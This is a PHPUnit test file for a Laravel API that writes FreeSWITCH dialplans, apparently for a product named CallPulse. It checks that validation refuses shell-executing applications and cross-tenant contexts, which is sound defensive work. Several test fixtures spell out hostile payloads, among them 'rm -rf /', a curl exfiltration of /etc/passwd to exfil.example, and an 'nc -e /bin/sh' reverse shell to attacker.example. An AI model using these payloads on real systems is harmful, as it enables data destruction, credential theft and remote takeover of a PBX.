<?php

namespace Tests\Unit\Api\V1;

use App\Http\Controllers\Api\V1\DialplanController;
use App\Http\Requests\Api\V1\StoreDialplanRequest;
use App\Http\Requests\Api\V1\UpdateDialplanRequest;
use App\Services\DialplanService;
use Illuminate\Contracts\Validation\Validator as ValidatorContract;
use Illuminate\Support\Facades\Validator;
use Tests\TestCase;

/**
 * The write rules of the dialplan endpoints (NOV-1009).
 *
 * EVERYTHING IN THIS FILE REALLY RUNS: neither the validation nor the payload
 * translation needs a database.
 *
 * Why it matters. DialplanService::save() is forgiving in the worst way:
 *   - normalizedDetails() DROPS WITHOUT A WORD any line with no
 *     `dialplan_detail_tag`, so a malformed payload becomes a plan with zero
 *     detail row — written, answered 201, and routing nothing;
 *   - an `action` line whose application is `system` or `spawn` executes a shell
 *     command on the PBX the next time the extension is dialled.
 *
 * There is one test per refused family on purpose: a single test covering them
 * all would still pass with one family missing from the implementation.
 */
class StoreDialplanRequestTest extends TestCase
{
    private const DOMAIN_UUID = '4018f7a3-8e0a-47bb-9f4f-04b1313e0e1b';
    private const DIALPLAN_UUID = '8c0f2b1d-1f2e-4a3b-9c4d-5e6f7a8b9c0d';

    // -----------------------------------------------------------------------
    // The lines are mandatory: a plan without lines routes nothing
    // -----------------------------------------------------------------------

    public function test_a_creation_without_any_line_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        unset($payload['details']);

        $this->assertArrayHasKey('details', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_a_creation_with_an_empty_line_array_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'] = [];

        $this->assertArrayHasKey('details', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_a_creation_requires_the_documented_attributes(): void
    {
        $errors = array_keys($this->validateStore([])->errors()->toArray());

        $this->assertEqualsCanonicalizing(
            ['dialplan_name', 'dialplan_context', 'dialplan_continue', 'dialplan_order', 'dialplan_enabled', 'details'],
            $errors
        );
    }

    /**
     * @dataProvider mandatoryLineFields
     */
    public function test_a_line_without_its_mandatory_field_is_refused(string $field): void
    {
        $payload = $this->validCreatePayload();
        unset($payload['details'][0][$field]);

        $this->assertArrayHasKey(
            "details.0.{$field}",
            $this->validateStore($payload)->errors()->toArray(),
            "A line without {$field} must be refused."
        );
    }

    public static function mandatoryLineFields(): array
    {
        return [
            // Without it the line is silently dropped by normalizedDetails().
            'tag' => ['dialplan_detail_tag'],
            // The condition field, or the FreeSWITCH application of an action.
            'type' => ['dialplan_detail_type'],
            // The regular expression, or the argument of the application.
            'data' => ['dialplan_detail_data'],
            // The rank inside the group: the array order itself is never read.
            'order' => ['dialplan_detail_order'],
        ];
    }

    public function test_an_unknown_line_tag_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][0]['dialplan_detail_tag'] = 'conditionnel';

        $this->assertArrayHasKey('details.0.dialplan_detail_tag', $this->validateStore($payload)->errors()->toArray());
    }

    /**
     * @dataProvider refusedOrders
     */
    public function test_an_order_that_is_not_a_positive_integer_is_refused(mixed $order): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][0]['dialplan_detail_order'] = $order;

        $this->assertArrayHasKey(
            'details.0.dialplan_detail_order',
            $this->validateStore($payload)->errors()->toArray(),
            'Order ' . json_encode($order) . ' should have been refused.'
        );
    }

    public static function refusedOrders(): array
    {
        return [
            'negative' => [-1],
            'not a number' => ['premier'],
            'decimal' => [10.5],
            'above the column range' => [10000],
            'null' => [null],
        ];
    }

    public function test_an_order_inside_the_range_is_accepted(): void
    {
        foreach ([0, 10, 9999] as $order) {
            $payload = $this->validCreatePayload();
            $payload['details'][0]['dialplan_detail_order'] = $order;

            $this->assertArrayNotHasKey(
                'details.0.dialplan_detail_order',
                $this->validateStore($payload)->errors()->toArray(),
                "Order {$order} should have been accepted."
            );
        }
    }

    public function test_a_group_outside_the_column_range_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][0]['dialplan_detail_group'] = 1000;

        $this->assertArrayHasKey('details.0.dialplan_detail_group', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_an_unknown_break_value_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][0]['dialplan_detail_break'] = 'sometimes';

        $this->assertArrayHasKey('details.0.dialplan_detail_break', $this->validateStore($payload)->errors()->toArray());
    }

    // -----------------------------------------------------------------------
    // Command execution guard — one test per refused application
    // -----------------------------------------------------------------------

    public function test_the_system_application_is_refused(): void
    {
        $this->assertApplicationRefused('system');
    }

    public function test_the_bgsystem_application_is_refused(): void
    {
        $this->assertApplicationRefused('bgsystem');
    }

    public function test_the_spawn_application_is_refused(): void
    {
        $this->assertApplicationRefused('spawn');
    }

    public function test_the_bg_spawn_application_is_refused(): void
    {
        $this->assertApplicationRefused('bg_spawn');
    }

    public function test_the_spawn_stream_application_is_refused(): void
    {
        $this->assertApplicationRefused('spawn_stream');
    }

    public function test_the_lua_application_is_refused(): void
    {
        $this->assertApplicationRefused('lua');
    }

    public function test_the_eval_application_is_refused(): void
    {
        $this->assertApplicationRefused('eval');
    }

    /**
     * The argument is inspected as well as the application: `set` with
     * `execute_on_answer=system …` runs the same shell command.
     */
    public function test_a_dangerous_application_hidden_in_the_argument_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][1] = [
            'dialplan_detail_tag' => 'action',
            'dialplan_detail_type' => 'set',
            'dialplan_detail_data' => 'execute_on_answer=system rm -rf /',
            'dialplan_detail_group' => 0,
            'dialplan_detail_order' => 20,
        ];

        $this->assertArrayHasKey('details.1.dialplan_detail_type', $this->validateStore($payload)->errors()->toArray());
    }

    /**
     * Same guard for the other code-execution directives: api_on_* pointing at
     * lua runs a script with the full switch API.
     */
    public function test_a_lua_call_hidden_in_an_api_on_directive_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][1] = [
            'dialplan_detail_tag' => 'action',
            'dialplan_detail_type' => 'set',
            'dialplan_detail_data' => 'api_on_answer=lua /tmp/payload.lua',
            'dialplan_detail_group' => 0,
            'dialplan_detail_order' => 20,
        ];

        $this->assertArrayHasKey('details.1.dialplan_detail_type', $this->validateStore($payload)->errors()->toArray());
    }

    /**
     * FreeSWITCH expands ${…} in condition attributes too: a condition field
     * carrying ${system(…)} executes the same shell command as the action.
     */
    public function test_a_command_hidden_in_a_condition_field_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][0] = [
            'dialplan_detail_tag' => 'condition',
            'dialplan_detail_type' => '${system(id)}',
            'dialplan_detail_data' => '^',
            'dialplan_detail_group' => 0,
            'dialplan_detail_order' => 10,
        ];

        $this->assertArrayHasKey('details.0.dialplan_detail_type', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_a_lua_call_hidden_in_a_condition_expression_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][0] = [
            'dialplan_detail_tag' => 'condition',
            'dialplan_detail_type' => 'destination_number',
            'dialplan_detail_data' => '${lua(/tmp/payload.lua)}',
            'dialplan_detail_group' => 0,
            'dialplan_detail_order' => 10,
        ];

        $this->assertArrayHasKey('details.0.dialplan_detail_type', $this->validateStore($payload)->errors()->toArray());
    }

    /**
     * Variable expansion is legitimate dialplan practice: a ${…} that names no
     * execution application must keep passing.
     */
    public function test_a_condition_on_an_expanded_variable_is_accepted(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][0] = [
            'dialplan_detail_tag' => 'condition',
            'dialplan_detail_type' => '${sip_from_host}',
            'dialplan_detail_data' => '^192\\.0\\.2\\.',
            'dialplan_detail_group' => 0,
            'dialplan_detail_order' => 10,
        ];

        $this->assertArrayNotHasKey('details.0.dialplan_detail_type', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_the_refusal_names_the_offending_line(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][2]['dialplan_detail_type'] = 'system';

        $errors = $this->validateStore($payload)->errors()->toArray();

        $this->assertArrayHasKey('details.2.dialplan_detail_type', $errors);
        $this->assertArrayNotHasKey('details.1.dialplan_detail_type', $errors);
        $this->assertArrayNotHasKey('details.3.dialplan_detail_type', $errors);
    }

    public function test_the_legitimate_applications_of_the_ai_dialplan_are_accepted(): void
    {
        foreach (['set', 'export', 'bridge', 'answer', 'playback'] as $application) {
            $payload = $this->validCreatePayload();
            $payload['details'][1]['dialplan_detail_type'] = $application;

            $this->assertArrayNotHasKey(
                'details.1.dialplan_detail_type',
                $this->validateStore($payload)->errors()->toArray(),
                "Application {$application} should have been accepted."
            );
        }
    }

    // -----------------------------------------------------------------------
    // The two write modes, and the ambiguity between them
    // -----------------------------------------------------------------------

    public function test_the_xml_mode_requires_the_xml_and_not_the_lines(): void
    {
        $errors = $this->validateStore([
            'dialplan_name' => 'callpulse_ai_9001',
            'dialplan_context' => 'client.exemple.fr',
            'dialplan_continue' => false,
            'dialplan_order' => 100,
            'dialplan_enabled' => true,
            'editor_mode' => 'xml',
        ])->errors()->toArray();

        $this->assertArrayHasKey('dialplan_xml', $errors);
        $this->assertArrayNotHasKey('details', $errors);
    }

    public function test_the_xml_mode_accepts_a_well_formed_extension(): void
    {
        $validator = $this->validateStore($this->validXmlPayload());

        $this->assertFalse($validator->fails(), json_encode($validator->errors()->toArray()));
    }

    public function test_a_malformed_xml_is_refused(): void
    {
        $payload = $this->validXmlPayload();
        $payload['dialplan_xml'] = '<extension name="callpulse_ai_9001">';

        $this->assertArrayHasKey('dialplan_xml', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_an_xml_whose_root_is_not_an_extension_is_refused(): void
    {
        $payload = $this->validXmlPayload();
        $payload['dialplan_xml'] = '<condition field="destination_number" expression="^9001$"/>';

        $this->assertArrayHasKey('dialplan_xml', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_an_xml_carrying_a_dangerous_application_is_refused(): void
    {
        $payload = $this->validXmlPayload();
        $payload['dialplan_xml'] = '<extension name="x"><condition field="destination_number" expression="^9001$">'
            . '<action application="system" data="curl http://exfil.example/$(cat /etc/passwd)"/>'
            . '</condition></extension>';

        $this->assertArrayHasKey('dialplan_xml', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_an_xml_carrying_a_lua_application_is_refused(): void
    {
        $payload = $this->validXmlPayload();
        $payload['dialplan_xml'] = '<extension name="x"><condition field="destination_number" expression="^9001$">'
            . '<action application="lua" data="/tmp/payload.lua"/>'
            . '</condition></extension>';

        $this->assertArrayHasKey('dialplan_xml', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_an_xml_carrying_an_eval_application_is_refused(): void
    {
        $payload = $this->validXmlPayload();
        $payload['dialplan_xml'] = '<extension name="x"><condition field="destination_number" expression="^9001$">'
            . '<action application="eval" data="${lua(/tmp/payload.lua)}"/>'
            . '</condition></extension>';

        $this->assertArrayHasKey('dialplan_xml', $this->validateStore($payload)->errors()->toArray());
    }

    /**
     * The data attribute is judged like the application: a harmless `set`
     * whose argument schedules `system` on answer is the same shell command.
     */
    public function test_an_xml_hiding_a_command_in_a_data_attribute_is_refused(): void
    {
        $payload = $this->validXmlPayload();
        $payload['dialplan_xml'] = '<extension name="x"><condition field="destination_number" expression="^9001$">'
            . '<action application="set" data="execute_on_answer=system id"/>'
            . '</condition></extension>';

        $this->assertArrayHasKey('dialplan_xml', $this->validateStore($payload)->errors()->toArray());
    }

    /**
     * FreeSWITCH expands ${…} in condition attributes as well: the field of a
     * condition is a code-execution vector, not only the actions.
     */
    public function test_an_xml_hiding_a_command_in_a_condition_field_is_refused(): void
    {
        $payload = $this->validXmlPayload();
        $payload['dialplan_xml'] = '<extension name="x"><condition field="${system(id)}" expression="^">'
            . '<action application="bridge" data="sofia/gateway/x/y"/>'
            . '</condition></extension>';

        $this->assertArrayHasKey('dialplan_xml', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_an_xml_hiding_lua_in_a_condition_expression_is_refused(): void
    {
        $payload = $this->validXmlPayload();
        $payload['dialplan_xml'] = '<extension name="x"><condition field="destination_number" expression="${lua(/tmp/payload.lua)}">'
            . '<action application="bridge" data="sofia/gateway/x/y"/>'
            . '</condition></extension>';

        $this->assertArrayHasKey('dialplan_xml', $this->validateStore($payload)->errors()->toArray());
    }

    /**
     * The well-formed extension of the contract carries a bridge to a gateway:
     * no execution keyword anywhere, it must keep passing.
     */
    public function test_an_xml_without_any_execution_keyword_still_passes(): void
    {
        $validator = $this->validateStore($this->validXmlPayload());

        $this->assertFalse($validator->fails(), json_encode($validator->errors()->toArray()));
    }

    /**
     * The two modes ignore each other in silence: in builder mode the XML sent is
     * thrown away, in xml mode no line is ever written. A body carrying both
     * without saying which must not be guessed at.
     */
    public function test_a_body_carrying_both_the_xml_and_the_lines_without_a_mode_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['dialplan_xml'] = '<extension name="callpulse_ai_9001"/>';

        $this->assertArrayHasKey('editor_mode', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_an_explicit_mode_settles_the_ambiguity(): void
    {
        $payload = $this->validCreatePayload();
        $payload['dialplan_xml'] = '<extension name="callpulse_ai_9001"/>';
        $payload['editor_mode'] = 'builder';

        $this->assertArrayNotHasKey('editor_mode', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_an_unknown_editor_mode_is_refused(): void
    {
        $payload = $this->validCreatePayload();
        $payload['editor_mode'] = 'wysiwyg';

        $this->assertArrayHasKey('editor_mode', $this->validateStore($payload)->errors()->toArray());
    }

    public function test_a_complete_legitimate_creation_passes(): void
    {
        $validator = $this->validateStore($this->validCreatePayload());

        $this->assertFalse($validator->fails(), json_encode($validator->errors()->toArray()));
    }

    // -----------------------------------------------------------------------
    // The partial update
    // -----------------------------------------------------------------------

    public function test_an_update_requires_nothing(): void
    {
        $this->assertFalse($this->validateUpdate([])->fails());
        $this->assertFalse($this->validateUpdate(['dialplan_enabled' => false])->fails());
    }

    /**
     * An update may empty the lines, which the creation may not: `details: []`
     * is an explicit whole-set replacement by nothing.
     */
    public function test_an_update_accepts_an_empty_line_array(): void
    {
        $this->assertArrayNotHasKey('details', $this->validateUpdate(['details' => []])->errors()->toArray());
    }

    public function test_an_update_keeps_the_line_rules_when_it_sends_lines(): void
    {
        $errors = $this->validateUpdate([
            'details' => [['dialplan_detail_type' => 'bridge', 'dialplan_detail_data' => 'sofia/gateway/x/y']],
        ])->errors()->toArray();

        $this->assertArrayHasKey('details.0.dialplan_detail_tag', $errors);
        $this->assertArrayHasKey('details.0.dialplan_detail_order', $errors);
    }

    public function test_an_update_still_refuses_a_dangerous_application(): void
    {
        $errors = $this->validateUpdate([
            'details' => [[
                'dialplan_detail_tag' => 'action',
                'dialplan_detail_type' => 'bgsystem',
                'dialplan_detail_data' => 'reboot',
                'dialplan_detail_order' => 10,
            ]],
        ])->errors()->toArray();

        $this->assertArrayHasKey('details.0.dialplan_detail_type', $errors);
    }

    /**
     * There is no editor_mode column: the controller infers the stored mode, so a
     * PATCH that sends raw XML without naming a mode could still have it written.
     * It is therefore inspected all the same.
     */
    public function test_an_update_inspects_the_xml_even_without_an_explicit_mode(): void
    {
        $errors = $this->validateUpdate([
            'dialplan_xml' => '<extension name="x"><condition field="destination_number" expression="^9001$">'
                . '<action application="spawn" data="nc -e /bin/sh attacker.example 4444"/>'
                . '</condition></extension>',
        ])->errors()->toArray();

        $this->assertArrayHasKey('dialplan_xml', $errors);
    }

    // -----------------------------------------------------------------------
    // The context is the tenant's, and only the tenant's
    // -----------------------------------------------------------------------

    public function test_the_tenant_own_domain_name_is_accepted_as_context(): void
    {
        $this->assertNull(StoreDialplanRequest::contextRejectionReason('client.exemple.fr', 'client.exemple.fr'));
    }

    /**
     * A dialplan written into the public context intercepts inbound calls of
     * every tenant.
     */
    public function test_the_public_context_is_refused(): void
    {
        $this->assertNotNull(StoreDialplanRequest::contextRejectionReason('public', 'client.exemple.fr'));
    }

    /**
     * The context of another domain routes that domain's calls: writing it
     * from this tenant is interception.
     */
    public function test_another_tenant_context_is_refused(): void
    {
        $this->assertNotNull(StoreDialplanRequest::contextRejectionReason('autre-client.fr', 'client.exemple.fr'));
    }

    /**
     * The shared contexts are not the tenant's domain name, so they are
     * refused by the same rule — no special case.
     */
    public function test_the_shared_contexts_are_refused(): void
    {
        $this->assertNotNull(StoreDialplanRequest::contextRejectionReason('global', 'client.exemple.fr'));
        $this->assertNotNull(StoreDialplanRequest::contextRejectionReason('${domain_name}', 'client.exemple.fr'));
    }

    // -----------------------------------------------------------------------
    // Translation of the validated body into what the service reads
    // -----------------------------------------------------------------------

    /**
     * The contract names the lines `details`, DialplanService::save() reads them
     * under `dialplan_details`. Without the rename the service receives no line,
     * writes a plan with no detail row and still answers 201.
     */
    public function test_the_lines_reach_the_service_under_the_key_it_reads(): void
    {
        $validated = $this->validateStore($this->validCreatePayload())->validated();

        $payload = DialplanController::toServicePayload($validated, self::DOMAIN_UUID);

        $this->assertArrayNotHasKey('details', $payload);
        $this->assertArrayHasKey('dialplan_details', $payload);
        $this->assertCount(8, $payload['dialplan_details']);
    }

    /**
     * The real gate: what normalizedDetails() keeps is what gets written to
     * v_dialplan_details. Eight lines in, eight lines written, in the engine's
     * order — not in the order of the array.
     */
    public function test_the_service_keeps_every_line_of_the_translated_payload(): void
    {
        $validated = $this->validateStore($this->validCreatePayload())->validated();
        $payload = DialplanController::toServicePayload($validated, self::DOMAIN_UUID);

        $normalized = app(DialplanService::class)->normalizedDetails($payload['dialplan_details']);

        $this->assertCount(8, $normalized, 'A line dropped here is a line missing from the dialplan.');
        $this->assertSame(
            [10, 20, 30, 40, 50, 55, 56, 60],
            array_column($normalized, 'dialplan_detail_order')
        );
        $this->assertSame('condition', $normalized[0]['dialplan_detail_tag']);
        $this->assertSame('bridge', $normalized[7]['dialplan_detail_type']);
        $this->assertSame('true', $normalized[7]['dialplan_detail_enabled']);
    }

    /**
     * The lines are re-sorted by group then order before writing: the position in
     * the array is never read.
     */
    public function test_the_lines_are_written_in_the_order_of_their_rank_not_of_the_array(): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'] = array_reverse($payload['details']);

        $validated = $this->validateStore($payload)->validated();
        $translated = DialplanController::toServicePayload($validated, self::DOMAIN_UUID);
        $normalized = app(DialplanService::class)->normalizedDetails($translated['dialplan_details']);

        $this->assertSame([10, 20, 30, 40, 50, 55, 56, 60], array_column($normalized, 'dialplan_detail_order'));
    }

    /**
     * v_dialplans stores its booleans as the TEXT 'true' / 'false'. Only
     * dialplan_enabled has a model mutator: a PHP false left on the two others
     * would be force-filled raw into a text column.
     */
    public function test_the_json_booleans_become_the_text_the_column_holds(): void
    {
        $validated = $this->validateStore($this->validCreatePayload() + ['dialplan_destination' => true])->validated();

        $payload = DialplanController::toServicePayload($validated, self::DOMAIN_UUID);

        $this->assertSame('false', $payload['dialplan_continue']);
        $this->assertSame('true', $payload['dialplan_enabled']);
        $this->assertSame('true', $payload['dialplan_destination']);
    }

    public function test_the_route_domain_is_the_only_attachment(): void
    {
        $other = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee';

        $validated = $this->validateStore($this->validCreatePayload() + ['domain_uuid' => $other])->validated();

        $this->assertArrayNotHasKey('domain_uuid', $validated, 'A body domain_uuid must never be validated.');
        $this->assertSame(
            self::DOMAIN_UUID,
            DialplanController::toServicePayload($validated, self::DOMAIN_UUID)['domain_uuid']
        );
    }

    // -----------------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------------

    private function assertApplicationRefused(string $application): void
    {
        $payload = $this->validCreatePayload();
        $payload['details'][1]['dialplan_detail_type'] = $application;

        $this->assertArrayHasKey(
            'details.1.dialplan_detail_type',
            $this->validateStore($payload)->errors()->toArray(),
            "Application {$application} should have been refused."
        );
    }

    private function collectionEndpoint(): string
    {
        return '/api/v1/domains/' . self::DOMAIN_UUID . '/dialplans';
    }

    private function itemEndpoint(): string
    {
        return $this->collectionEndpoint() . '/' . self::DIALPLAN_UUID;
    }

    private function validateStore(array $payload): ValidatorContract
    {
        $form = StoreDialplanRequest::create($this->collectionEndpoint(), 'POST', $payload);
        $validator = Validator::make($form->all(), $form->rules());
        $form->withValidator($validator);

        return $validator;
    }

    private function validateUpdate(array $payload): ValidatorContract
    {
        $form = UpdateDialplanRequest::create($this->itemEndpoint(), 'PATCH', $payload);
        $validator = Validator::make($form->all(), $form->rules());
        $form->withValidator($validator);

        return $validator;
    }

    /**
     * The AI extension dialplan CallPulse really sends: a destination_number
     * condition, the four X-Callpulse-* headers, and the bridge to the operator
     * gateway. Same ranks as the plan running on the PBX.
     */
    private function validCreatePayload(): array
    {
        $gateway = '47aa96db-3f70-46ce-bb9a-79ccef396f2b';
        $destination = 'cp90029ad0b3ae08';

        $line = fn (string $tag, string $type, string $data, int $order): array => [
            'dialplan_detail_tag' => $tag,
            'dialplan_detail_type' => $type,
            'dialplan_detail_data' => $data,
            'dialplan_detail_group' => 0,
            'dialplan_detail_order' => $order,
            'dialplan_detail_enabled' => true,
        ];

        return [
            'dialplan_name' => 'callpulse_ai_9001',
            'dialplan_number' => '9001',
            'dialplan_context' => 'client.exemple.fr',
            'dialplan_continue' => false,
            'dialplan_order' => 100,
            'dialplan_enabled' => true,
            'dialplan_description' => 'Extension IA CallPulse — poste 9001',
            'details' => [
                $line('condition', 'destination_number', '^9001$', 10),
                $line('action', 'set', 'hangup_after_bridge=true', 20),
                $line('action', 'set', 'continue_on_fail=false', 30),
                $line('action', 'export', 'sip_h_X-Callpulse-Binding-Id=b-1', 40),
                $line('action', 'export', 'sip_h_X-Callpulse-Org-Id=org-1', 50),
                $line('action', 'export', 'sip_h_X-Callpulse-DID=9001', 55),
                $line('action', 'export', 'sip_h_X-Callpulse-Caller=${caller_id_number}', 56),
                $line('action', 'bridge', "sofia/gateway/{$gateway}/{$destination}", 60),
            ],
        ];
    }

    private function validXmlPayload(): array
    {
        return [
            'dialplan_name' => 'callpulse_ai_9001',
            'dialplan_context' => 'client.exemple.fr',
            'dialplan_continue' => false,
            'dialplan_order' => 100,
            'dialplan_enabled' => true,
            'editor_mode' => 'xml',
            'dialplan_xml' => '<extension name="callpulse_ai_9001" continue="false">'
                . '<condition field="destination_number" expression="^9001$">'
                . '<action application="bridge" data="sofia/gateway/47aa96db-3f70-46ce-bb9a-79ccef396f2b/cp90029ad0b3ae08"/>'
                . '</condition></extension>',
        ];
    }
}
